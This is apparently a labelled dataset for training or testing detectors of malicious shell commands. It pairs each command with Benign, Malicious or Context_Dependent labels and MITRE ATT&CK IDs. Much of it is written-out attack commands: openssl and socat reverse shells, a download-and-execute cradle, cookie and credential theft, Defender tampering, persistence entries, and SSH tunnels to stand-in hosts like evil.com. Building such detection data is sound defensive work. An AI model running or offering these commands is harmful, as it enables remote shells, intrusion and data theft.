command,label,original_label,mitre_id
sam package,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:443,Malicious,Synthetic,Synthetic
crontab -l,Benign,Synthetic,Synthetic
"echo ""$password"" | pw usermod $username -h 0",Malicious,Malicious,T1136
opencode uninstall [-f|--force],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:445 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:143,Malicious,Synthetic,Synthetic
rabbitmq-plugins disable plugin,Benign,Benign,Benign
cfv -Czvl -p path/to/directory,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
"ftype file_type=""path\to\executable_file""",Benign,Benign,Benign
wasm-objdump [-d|--disassemble] file.wasm,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:5432 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:8081,Malicious,Synthetic,Synthetic
edgepaint -color-scheme=accent7 path/to/layout.gv > path/to/output.gv,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:3306 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
git flow feature start feature,Benign,Benign,Benign
strace -e trace=file -p 3306,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:192.168.1.1:80 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.10:3389 jenkins@10.0.0.100,Context_Dependent,Synthetic,Synthetic
else: import urllib as r,Malicious,Malicious,T1105
scala [-cp|--extra-jars] filename.jar command,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:8081,Malicious,Synthetic,Synthetic
qm start 100 --machine q35,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:53 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
fdroidcl download app_id,Benign,Benign,Benign
tail -20 /etc/security/limits.conf,Context_Dependent,Synthetic,Synthetic
gio info path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:5432 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:8081,Malicious,Synthetic,Synthetic
column /path/to/input-file,Context_Dependent,Malicious,T1005
theHarvester -d ops-audit.internal -b google,Context_Dependent,Synthetic,Synthetic
<key>/path/to/output-dir/output-file</key>,Malicious,Malicious,T1222
nano path/to/file1 path/to/file2 ...,Benign,Benign,Benign
sn -e path/to/assembly.dll path/to/output.pub,Benign,Benign,Benign
"echo ""### END INIT INFO"" >> /etc/init.d/T1543.002",Malicious,Malicious,T1543
simplehttpserver -verbose,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:80 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Roaming\Microsoft\Credentials\,Malicious,Malicious,T1552
openssl s_client -quiet -connect 192.168.1.100:3389 | /bin/bash | openssl s_client -quiet -connect 192.168.0.50:8081,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:192.168.1.254:80 user@10.10.10.10,Context_Dependent,Synthetic,Synthetic
patch < patch.diff [-R|--reverse],Benign,Benign,Benign
ln -fs /bin/sh /bin/ln,Malicious,Malicious,T1548
ssh -fN -L 8080:10.0.0.1:8888 support@10.0.0.5,Context_Dependent,Synthetic,Synthetic
nano /home/user/nginx.conf,Benign,Synthetic,Synthetic
sudo squid -k reconfigure,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:8888,Malicious,Synthetic,Synthetic
"find /path/to/dir/* -printf ""%T@|%p|%l"" -exec stat -Lc ""|%Y.0000000000"" {} \;",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:6379 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:4445,Malicious,Synthetic,Synthetic
ls *.txt | tee /dev/tty txtlist.txt,Benign,Benign,Benign
sudo -l,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:172.20.10.8:22 root@evil.com,Context_Dependent,Synthetic,Synthetic
sshuttle -r backup@malware.site 0/0,Context_Dependent,Synthetic,Synthetic
keyctl add type_keyring key_name key_value target_keyring,Benign,Benign,Benign
curl -s http://search.twitter.com/search.json?q=node.js | json,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f,Malicious,Malicious,T1112
GetNPUsers.py domain/username -hashes LM_Hash:NT_Hash -usersfile path/to/userslist -dc-ip domain_controller_ip,Benign,Benign,Benign
httpflow -i any,Benign,Benign,Benign
ls -1 | perl -l40pe0,Benign,Benign,Benign
strace -p 995,Context_Dependent,Synthetic,Synthetic
"alias -g X2=""| cut -d' ' -f2""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9090,Malicious,Synthetic,Synthetic
nohup php newEmptyPHP.php &,Benign,Benign,Benign
tcpdump -i enp0s3 -c 9001,Context_Dependent,Synthetic,Synthetic
tcpdump -i enp0s3 port 993,Context_Dependent,Synthetic,Synthetic
ifdata -e eth0,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.100:995 deploy@192.168.1.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9090 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:8081,Malicious,Synthetic,Synthetic
vault seal,Benign,Benign,Benign
Filter = [Ref] $Filter;,Malicious,Malicious,T1546
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:9002,Malicious,Synthetic,Synthetic
set -o emacs,Benign,Benign,Benign
crush [-v|--version],Benign,Benign,Benign
find . -type f -mtime +7 | xargs tar -cvf `date '+%d%m%Y'_archive.tar`,Benign,Benign,Benign
makoctl help,Benign,Benign,Benign
spa-acp-tool [gv|get-volume] device_id,Benign,Benign,Benign
ftxdiff --output path/to/fontdiff_file.txt path/to/font_file1.ttc path/to/font_file2.ttc,Benign,Benign,Benign
aws sqs delete-message --queue-url https://queue_url --receipt-handle receipt_handle,Benign,Benign,Benign
find <directory> -type f -size -1M -print0 | xargs -0 rm,Benign,Benign,Benign
snoop -d e1000g0,Benign,Benign,Benign
am to-uri -a android.intent.action.VIEW -d tel:123,Benign,Benign,Benign
"else { Write-Host "". "" -NoNewline}",Malicious,Malicious,T1110
column list-of-entries.txt,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8443,Malicious,Synthetic,Synthetic
"xmllint --html --xpath ""string(//a[2]/@href)"" webpage.xhtml",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:53 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:4445,Malicious,Synthetic,Synthetic
readlink /dev/disk/by-uuid/b928a862-6b3c-45a8-82fe-8f1db2863be3,Benign,Benign,Benign
tail -100 /var/log/auth.log,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.10.10.50:3389 svcuser@10.0.0.25,Context_Dependent,Synthetic,Synthetic
scamper -i 192.0.2.1,Benign,Benign,Benign
mkcert example.org,Benign,Benign,Benign
"& ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" $optional_args -h $domain -s subtree -f ""objectclass=computer"" *",Context_Dependent,Malicious,T1087
ssh -fN -L 8080:10.0.0.5:80 svcuser@10.0.0.100,Context_Dependent,Synthetic,Synthetic
"Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Shell-backup"" -Value ""$oldvalue"";",Malicious,Malicious,T1547
mplayer -loop 0 path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:1433,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
gc -?,Benign,Benign,Benign
"mimikatz ""dpapi::chrome /in:Login Data""",Malicious,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:53,Malicious,Synthetic,Synthetic
GetADUsers.py -all -dc-ip domain_controller_ip domain/username:password,Benign,Benign,Benign
atop -m,Benign,Benign,Benign
orb exec vm_name command,Benign,Benign,Benign
"SyncAppvPublishingServer.vbs ""n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX""",Malicious,Malicious,T1216
ssh -fN -L 8080:10.0.0.10:80 postgres@10.0.0.50,Context_Dependent,Synthetic,Synthetic
tail -20 /etc/apache2/apache2.conf,Benign,Synthetic,Synthetic
afinfo --help,Benign,Benign,Benign
sudo btrfs [c|check] [-p|--progress] path/to/partition,Benign,Benign,Benign
upower [-m|--monitor],Benign,Benign,Benign
fwupdtool get-devices,Benign,Benign,Benign
find /tmp/ -type f -mtime +1 -exec rm {} \;,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:6379,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:192.168.1.254:445 audit@payload.c2,Context_Dependent,Synthetic,Synthetic
sshuttle -r postgres@10.20.30.40 0/0,Context_Dependent,Synthetic,Synthetic
cat /etc/nginx/nginx.conf,Benign,Synthetic,Synthetic
sshuttle -r audit@malware.site 10.0.0.0/24,Context_Dependent,Synthetic,Synthetic
beet stats,Benign,Benign,Benign
linode-cli tickets replies ticket_id,Benign,Benign,Benign
tcpdump -i enp0s3 port 9001,Context_Dependent,Synthetic,Synthetic
pnmalias path/to/input.pnm > path/to/output.ppm,Benign,Benign,Benign
find -mindepth 3 -type d ! -path '*/p/*' -name c -print,Benign,Benign,Benign
file file-name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.0.50:3389,Malicious,Synthetic,Synthetic
az advisor recommendation list,Benign,Benign,Benign
pgmhist [-ma|-machine] path/to/image.pgm,Benign,Benign,Benign
pg_controldata [-?|--help],Benign,Benign,Benign
xcode-select --print-path,Benign,Benign,Benign
sudo termshark interface,Benign,Benign,Benign
pwqgen config=path/to/config_file,Benign,Benign,Benign
sudo lid username,Benign,Benign,Benign
geth account new,Benign,Benign,Benign
systemctl is-enabled rsyslog,Context_Dependent,Synthetic,Synthetic
diff -Naur dir1/ dir2/,Benign,Benign,Benign
unimatrix --color red|green|blue|white|...,Benign,Benign,Benign
systemctl is-active kubelet,Context_Dependent,Synthetic,Synthetic
hatch clean,Benign,Benign,Benign
sudo hostapd path/to/hostapd.conf,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:993,Malicious,Synthetic,Synthetic
"dirsearch [-u|--url] url --extensions-list [-w|--wordlists] path/to/url-paths1.txt,path/to/url-paths2.txt,...",Benign,Benign,Benign
dbus-daemon --syslog,Benign,Benign,Benign
diff -qr directory directory.original | cut -d' ' -f2 | xargs dirname | uniq,Benign,Benign,Benign
transmission-create [-o|--outfile] path/to/example.torrent [-t|--tracker] tracker_url1 [-c|--comment] comment path/to/file_or_directory,Benign,Benign,Benign
fdroid lint --format app_id,Benign,Benign,Benign
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\,Malicious,Malicious,T1547
dockdiver -url https://example.com -list,Benign,Benign,Benign
awk -F '\t' '{print $2}' * | sort | uniq -c | sort -nr,Benign,Benign,Benign
flips --create path/to/original_file path/to/modified_file path/to/output_patch.bps,Benign,Benign,Benign
command | b3sum,Benign,Benign,Benign
find /path/to/dir -type f -exec chmod 644 {} +,Benign,Benign,Benign
postcss path/to/file --parser parser,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.10:80 user@192.168.1.254,Context_Dependent,Synthetic,Synthetic
bun init [-m|--minimal],Benign,Benign,Benign
dnsrecon [-d|--domain] example.com -s [-j|--json],Benign,Benign,Benign
squeue [-i|--iterate] 5,Benign,Benign,Benign
find /var/log -daystart -mtime 0,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
tcpdump -i wlan0 -w /tmp/.agent,Context_Dependent,Synthetic,Synthetic
strace -e trace=file -p 1234,Context_Dependent,Synthetic,Synthetic
ctr images list,Benign,Benign,Benign
"cd ""$TAG""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:53,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:995,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:4445,Malicious,Synthetic,Synthetic
dotnet publish [-o|--output] path/to/directory path/to/project_file,Benign,Benign,Benign
wormhole send,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:995,Malicious,Synthetic,Synthetic
ppmrainbow [-w|-width] width [-h|-height] height color1 color2 ... > path/to/output_file.ppm,Benign,Benign,Benign
fwconsole stop,Benign,Benign,Benign
sudo pvs [-o|--options] +field_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:6379,Malicious,Synthetic,Synthetic
amass -help,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:110 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:1433,Malicious,Synthetic,Synthetic
cluster -o output.gv input.gv,Benign,Benign,Benign
ssh -fN -L 8080:172.16.0.10:80 operator@corp-backup.internal,Context_Dependent,Synthetic,Synthetic
ntpctl -s [p|peers],Benign,Benign,Benign
qm [di|disk] [resc|rescan],Benign,Benign,Benign
ssh -w 0:0 postgres@staging.lab,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:110,Malicious,Synthetic,Synthetic
oldchecks -noninteractive -consoleoutput,Context_Dependent,Malicious,T1082
openssl s_client -quiet -connect 192.168.1.10:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:1433,Malicious,Synthetic,Synthetic
phpstan analyse --help,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:9090 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
apx pkgmanagers list,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.25:22 support@172.16.0.25,Context_Dependent,Synthetic,Synthetic
setxkbmap -help,Benign,Benign,Benign
flash -p cat,Benign,Benign,Benign
ssh -fN -L 8080:10.10.10.10:3306 support@192.168.1.1,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.10:80 user@172.16.0.10,Context_Dependent,Synthetic,Synthetic
xbacklight -set 100 -time 60000 -steps 60,Benign,Benign,Benign
cat /dev/input/mice | od -t x1 -w3,Benign,Benign,Benign
maestral resume,Benign,Benign,Benign
compgen -c,Benign,Benign,Benign
"gamescope [-O|--prefer-output] HDMI-A-1,DP-3,... -- program",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:8443,Malicious,Synthetic,Synthetic
"find -name ""*.htm"" -print",Benign,Benign,Benign
gst-launch-1.0 source ! videoconvert ! sink,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:80,Malicious,Synthetic,Synthetic
kpartx -d whole_disk.img,Benign,Benign,Benign
"echo /dev/stratis/pool_name/volume_name /mnt/target xfs defaults,x-systemd.requires=stratisd.service 0 0 | sudo tee [-a|--append] /etc/fstab",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:8080,Malicious,Synthetic,Synthetic
rg --files | rg pattern,Benign,Benign,Benign
stressapptest -M memory -v level,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.100:80 user@192.168.0.5,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
find . -type f -newerat 2008-09-29 ! -newerat 2008-09-30,Benign,Benign,Benign
more path\to\file +5,Benign,Benign,Benign
zdb [-C|--config] poolname,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8888 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8443,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.50:8888 deploy@internal.corp,Context_Dependent,Synthetic,Synthetic
LOCALAPPDATA%\MicroSoft Updatea\uplog.tmp,Malicious,Malicious,T1074
tcpdump -i ens160 port 995,Context_Dependent,Synthetic,Synthetic
accelerate config,Benign,Benign,Benign
k6 run script.js,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.10:80 svcuser@target.com,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:5432 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
wlsunset -l latitude -L longitude,Benign,Benign,Benign
find . -type d -atime $FTIME,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3306,Malicious,Synthetic,Synthetic
elasticsearch-node diagnostics,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.25:443 audit@10.0.0.8,Context_Dependent,Synthetic,Synthetic
ipython locate profile,Benign,Benign,Benign
xfreerdp /u:username /p:password /v:ip_address /sound:sys:alsa,Benign,Benign,Benign
qmmp --volume-inc|dec,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.5:143 user@10.0.0.100,Context_Dependent,Synthetic,Synthetic
"echo ""ExecStart=$execstart_action"" >> $systemd_service_path/$systemd_service_file",Malicious,Malicious,T1543
find . -name '*.[ch]' | xargs grep -l thing,Benign,Benign,Benign
find . -name not\* | tail -1 | xargs rm,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:143 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.5:1433 deploy@evil.com,Context_Dependent,Synthetic,Synthetic
redis-server,Benign,Benign,Benign
git graft source_branch target_branch,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:8081,Malicious,Synthetic,Synthetic
smem,Benign,Benign,Benign
slurmrestd -f path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:995,Malicious,Synthetic,Synthetic
podman build path/to/directory,Benign,Benign,Benign
"osascript -e 'tell application ""Finder""' -e 'set destinationFolderPath to POSIX file ""$destination_path""' -e 'set safariFolder to ((path to library folder from user domain as text) & ""Containers:com.apple.Safari:Data:Library:Cookies:"")' -e 'duplicate file ""Cookies.binarycookies"" of folder safariFolder to folder destinationFolderPath with replacing' -e 'end tell'",Malicious,Malicious,T1539
wc [-l|--lines] path/to/file,Benign,Benign,Benign
serialver -classpath path/to/directory classname1:classname2:...,Benign,Benign,Benign
dmesg -T | grep -i error,Benign,Synthetic,Synthetic
dscl . -create /Users/$username UserShell /bin/zsh,Malicious,Malicious,T1136
drop table table_name;,Benign,Benign,Benign
tcpdump -i eth0 host 192.168.1.254,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:1433,Malicious,Synthetic,Synthetic
ibmcloud [v|version],Benign,Benign,Benign
openssl genrsa,Benign,Benign,Benign
gdebi path/to/package.deb [-o|--option] APT_OPTS,Benign,Benign,Benign
bpkg run command argument1 argument2 ...,Benign,Benign,Benign
"find /var/www/vhosts/*/httpdocs/ -type f -wholename *includes/constants.php -exec grep -H ""PHPBB_VERSION"" {} \;",Benign,Benign,Benign
find . -type f -size +500M,Benign,Benign,Benign
cargo init path/to/directory,Benign,Benign,Benign
tree path\to\directory /a,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.10:80 backup@192.168.0.50,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:993,Malicious,Synthetic,Synthetic
git-sizer -v,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8888,Malicious,Synthetic,Synthetic
ganache-cli --accounts=number_of_accounts,Benign,Benign,Benign
df -k /dir/inner_dir/,Benign,Benign,Benign
systemctl status mysql,Context_Dependent,Synthetic,Synthetic
dutree --depth depth,Benign,Benign,Benign
schroot --all command,Benign,Benign,Benign
pveum [u|user] [a|add] username@pve --email email_address --comment description --password password,Benign,Benign,Benign
"echo -e ""red\ngreen\nblue"" | fuzzel [-d|--dmenu] > color.txt",Benign,Benign,Benign
fileicon set path/to/file_or_directory path/to/icon_file.png,Benign,Benign,Benign
truffle help subcommand,Benign,Benign,Benign
chmod o=g path/to/file,Benign,Benign,Benign
"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:31337",Malicious,Synthetic,Synthetic
"black [-c|--code] ""code""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:9002,Malicious,Synthetic,Synthetic
gitleaks detect [-s|--source] path/to/repository --config-path path/to/config.toml,Benign,Benign,Benign
avahi-browse [-a|--all] [-t|--terminate] [-p|--parsable],Benign,Benign,Benign
sudo lsusb -t|less,Benign,Benign,Benign
find . -type f -exec perl -i -pe 's/something/another/g' {} \;,Benign,Benign,Benign
find . -name xxx -exec command {} +,Benign,Benign,Benign
find /usr/bin -type f -size -50c -exec ls -l '{}' ';',Benign,Benign,Benign
tcpdump -i ens160 port 9001,Context_Dependent,Synthetic,Synthetic
dokku db:link db_name app_name,Benign,Benign,Benign
piactl get regions,Benign,Benign,Benign
read -n1,Benign,Benign,Benign
"bind -x '""key_sequence"":command'",Benign,Benign,Benign
cat $filename | rev | cut -c 3- | rev,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.1:9001 user@192.168.1.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
pnmcolormap [-splits|-splitspread] n_colors path/to/input.pnm > path/to/output.ppm,Benign,Benign,Benign
nix-shell [-p|--packages] package1 package2 ... [-I|--include] nixpkgs=https://github.com/NixOS/nixpkgs/archive/nixpkgs_revision.tar.gz,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:110 | /bin/bash | openssl s_client -quiet -connect 192.168.0.50:9002,Malicious,Synthetic,Synthetic
mpd,Benign,Benign,Benign
w32tm /query /status /verbose,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:4445,Malicious,Synthetic,Synthetic
plasma-apply-desktoptheme default,Benign,Benign,Benign
MIXER,Benign,Benign,Benign
docker compose down --rmi all,Benign,Benign,Benign
iwlist wireless_interface auth,Benign,Benign,Benign
slocate -q,Benign,Benign,Benign
net view /all,Context_Dependent,Malicious,T1135
tail -100 /var/log/apache2/access.log,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:3306 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:8081,Malicious,Synthetic,Synthetic
sshuttle -r postgres@10.0.0.25 172.16.0.10/24,Context_Dependent,Synthetic,Synthetic
spotify play song_name,Benign,Benign,Benign
launchctl unload ~/Library/LaunchAgents/my_script.plist,Benign,Benign,Benign
"find . ! -path ""*/test/*"" -type f -name ""*.js"" ! -name ""*-min-*"" ! -name ""*console*""",Benign,Benign,Benign
git brv,Benign,Benign,Benign
"find . -name ""*.java"" -print0 | xargs -0 -J % cp % destinationFolder",Benign,Benign,Benign
neofetch --os_arch on|off,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.100:80 user@10.10.10.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:143 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
tcpdump -i ens33 port 143,Context_Dependent,Synthetic,Synthetic
busybox cat,Malicious,Malicious,T1548
find /etc -name '*.conf',Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:6379,Malicious,Synthetic,Synthetic
cs fetch --default=true --sources --javadoc group_id:artifact_id:artifact_version,Benign,Benign,Benign
streamlit --version,Benign,Benign,Benign
"if [ -x ""$(command -v tshark)"" ]; then sudo tshark -c 5 -i $interface; fi;",Context_Dependent,Malicious,T1040
theHarvester -d cdn-sync.bad -b google,Context_Dependent,Synthetic,Synthetic
bd list,Benign,Benign,Benign
pdfattach [-h|--help],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:993 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:8081,Malicious,Synthetic,Synthetic
slurp -p,Benign,Benign,Benign
brew services stop formula,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.1:9090 root@192.168.1.10,Context_Dependent,Synthetic,Synthetic
systemctl halt --when +2h,Benign,Benign,Benign
groff path/to/input.roff > path/to/output.ps,Benign,Benign,Benign
tcpdump -i eth0 host 10.0.0.10,Context_Dependent,Synthetic,Synthetic
